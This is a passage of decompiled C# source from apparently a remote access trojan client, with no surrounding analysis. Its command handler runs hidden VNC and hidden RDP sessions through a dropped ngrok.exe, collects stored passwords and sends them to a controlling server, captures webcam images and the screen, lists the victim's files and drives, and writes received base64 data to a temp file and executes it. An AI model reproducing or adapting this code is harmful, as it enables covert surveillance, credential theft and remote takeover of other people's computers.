							array25[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[2]), typeof(string));
						}
						if (array11[3])
						{
							array7[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[3]), typeof(string));
						}
						if (array11[4])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[4]), typeof(string));
						}
						RS = 2;
						GC.Collect();
					}
					break;
				case "RDEC":
					if (RS == 2)
					{
						RS = 1;
						NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "DEC", new object[1] { Helper.GetHash(Helper.ID()) }, (string[])null, (Type[])null, (bool[])null, true);
						RS = 0;
						GC.Collect();
					}
					break;
				case "HVNC":
				{
					object obj6 = Helper.objj(array[1]);
					object[] array2 = new object[2];
					object[] array18 = array2;
					string[] array4 = array;
					string[] array19 = array4;
					int num = 2;
					array18[0] = array19[2];
					object[] array20 = array2;
					string[] array7 = array;
					string[] array21 = array7;
					int num2 = 3;
					array20[1] = array21[3];
					object[] array9 = array2;
					object[] array22 = array9;
					bool[] array11 = new bool[2] { true, true };
					NewLateBinding.LateCall(obj6, (Type)null, "Run", array22, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					if (array11[1])
					{
						array7[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					GC.Collect();
					break;
				}
				case "ngrok":
					ClientSocket.Send("ngrok");
					break;
				case "InstallN":
					if (ngrok != 1)
					{
						ngrok = 1;
						object obj4 = Helper.objj(array[1]);
						object[] array2 = new object[1];
						object[] array14 = array2;
						string[] array4 = array;
						string[] array15 = array4;
						int num = 2;
						array14[0] = array15[2];
						object[] array9 = array2;
						object[] array16 = array9;
						bool[] array11 = new bool[1] { true };
						NewLateBinding.LateCall(obj4, (Type)null, "install", array16, (string[])null, (Type[])null, array11, true);
						if (array11[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
						}
						ClientSocket.Send("InstallngC");
						ngrok = 0;
						GC.Collect();
					}
					break;
				case "vncs":
					if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
					{
						NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						GC.Collect();
						ClientSocket.Send("%$3");
					}
					else
					{
						ClientSocket.Send("ngrok");
					}
					break;
				case "hrdp":
					if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
					{
						ClientSocket.Send("hrdp");
					}
					else
					{
						ClientSocket.Send("ngrok");
					}
					break;
				case "hrdp+":
				{
					object obj = Operators.ConcatenateObject((object)"hrdp+", SPL);
					object obj2 = Helper.objj(array[1]);
					object[] array2 = new object[2];
					object[] array3 = array2;
					string[] array4 = array;
					string[] array5 = array4;
					int num = 2;
					array3[0] = array5[2];
					object[] array6 = array2;
					string[] array7 = array;
					string[] array8 = array7;
					int num2 = 3;
					array6[1] = array8[3];
					object[] array9 = array2;
					object[] array10 = array9;
					bool[] array11 = new bool[2] { true, true };
					object obj3 = NewLateBinding.LateGet(obj2, (Type)null, "install", array10, (string[])null, (Type[])null, array11);
					if (array11[0])
					{
						array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					if (array11[1])
					{
						array7[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(obj, obj3)));
					GC.Collect();
					break;
				}
				case "PassR":
					ClientSocket.Send("PassR");
					break;
				case "PC#":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Getpass", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "get", new object[0], (string[])null, (Type[])null, (bool[])null))));
					GC.Collect();
					break;
				case "Pvbnet":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Getpass", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null))));
					GC.Collect();
					break;
				case "WDPL":
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					GC.Collect();
					break;
				}
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] compress(Bitmap imgg, int Q)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		byte[] result = default(byte[]);
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			Encoder quality = Encoder.Quality;
			EncoderParameters val = new EncoderParameters(1);
			EncoderParameter val2 = new EncoderParameter(quality, (long)Q);
			val.get_Param()[0] = val2;
			ImageCodecInfo encoderInfo = RemoteDesktop.GetEncoderInfo(ImageFormat.get_Jpeg());
			((Image)imgg).Save((Stream)memoryStream, encoderInfo, val);
			val.Dispose();
			val2.Dispose();
			((Image)imgg).Dispose();
			GC.Collect();
			ImageConverter val3 = new ImageConverter();
			result = (byte[])((TypeConverter)(object)val3).ConvertTo((object?)Image.FromStream((Stream)memoryStream), typeof(byte[]));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string STOBS64(string s)
	{
		string result = default(string);
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			result = Convert.ToBase64String(bytes);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("user32")]
	public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string lpszVer = null;
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static byte[] Shot(int W, int H, int Q)
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		byte[] result = default(byte[]);
		try
		{
			Handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, W, H, 0, 0);
			SendMessage(Handle, 1034u, 0, 0);
			SendMessage(Handle, 1074u, 0, 0);
			SendMessage(Handle, 1084u, 0, 0);
			SendMessage(Handle, 1054u, 0, 0);
			SendMessage(Handle, 1035u, 0, 0);
			result = compress((Bitmap)(Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap), Q);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string getFolders(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		object obj = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			obj = Operators.AddObject(obj, (object)string.Concat("[Folder]" + directoryInfo2.get_Name(), "FileManagerSplitFileManagerSplit"));
		}
		return Conversions.ToString(obj);
	}

	public static string getFiles(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		object obj = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			obj = Operators.AddObject(obj, (object)string.Concat(string.Concat(fileInfo.get_Name() + "FileManagerSplit", fileInfo.Length.ToString()), "FileManagerSplit"));
		}
		return Conversions.ToString(obj);
	}

	public static string getDrives()
	{
		string text = "";
		foreach (DriveInfo drife in ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives())
		{
			switch (drife.DriveType)
			{
			case DriveType.Removable:
				text = text + "[USB]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Fixed:
				text = text + "[Drive]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.Network:
				text = text + "[NET]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			case DriveType.CDRom:
				text = text + "[CD]" + drife.Name + "FileManagerSplitFileManagerSplit";
				break;
			}
		}
		return text;
	}

	private static void Download(string Name, string Data)
	{
		try
		{
			object obj = Path.GetTempFileName() + Name;
			File.WriteAllBytes(Conversions.ToString(obj), (byte[])Helper.frombase64(Data));
			Thread.Sleep(500);
			Type typeFromHandle = typeof(Process);
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				obj = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
